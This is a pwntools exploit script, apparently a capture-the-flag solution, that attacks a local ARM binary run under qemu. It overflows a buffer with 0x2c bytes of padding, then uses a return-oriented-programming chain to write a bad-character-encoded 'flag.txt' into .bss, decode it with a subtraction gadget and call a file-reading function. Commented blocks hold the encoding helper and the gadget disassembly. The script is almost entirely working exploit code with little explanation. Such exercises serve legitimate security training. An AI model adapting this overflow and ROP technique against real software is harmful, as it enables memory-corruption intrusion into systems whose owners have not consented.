from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)

io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])
"""
flag.txt
0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74
"""

"""
s = [0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74]
badchar = [0x78, 0x61, 0x67, 0x2e]
flag = False
n = 0
for i in range(32, 127):
        if (flag): break
        n = i
        flag = True
        for j in s:
                if (flag == False): break
                for k in badchar:
                     if (i+j) == k or flag == False:
                        flag = False
                        break
print(n)
for i in s:
        print(hex(i+n), end=", ")
print("")

for i in badchar:
        print(hex(i), end=", ")
print("")
"""

"""
32
0x86, 0x8c, 0x81, 0x87, 0x4e, 0x94, 0x98, 0x94,
0x78, 0x61, 0x67, 0x2e,
"""
"""
.text:000105F0 00 10 95 E5                   LDR     R1, [R5]
.text:000105F4 06 10 41 E0                   SUB     R1, R1, R6
.text:000105F8 00 10 85 E5                   STR     R1, [R5]
.text:000105FC 01 80 BD E8                   POP     {R0,PC}

.init:00010474 23 00 00 EB                   BL      call_weak_fn
0x00010478 : pop {r3, pc}
0x000105b0 : pop {r4, pc}

.text:00010610 00 30 84 E5                   STR     R3, [R4]
.text:00010614 60 80 BD E8                   POP     {R5,R6,PC}

"""


bss = ELF("./pwn").bss() + 0x50

pay  = b'A'*0x2c+ p32(0x10474) + b'\x86\x8c\x81\x87' + p32(0x105b0) + p32(bss) + p32(0x10610) + b'AAAA'*2
pay += p32(0x10474) + b'\x4e\x94\x98\x94' + p32(0x105b0) + p32(bss+4) + p32(0x10610)
pay += p32(bss+0) + p32(0x20202020) + p32(0x105f0) + b'AAAA' + p32(0x10614)
pay += p32(bss+4) + p32(0x20202020) + p32(0x105f0) + p32(bss) + p32(0x000104b4)

print("pay len: ", hex(len(pay)))
print(pay)

io.sendlineafter(b'> ', pay)
io.interactive()
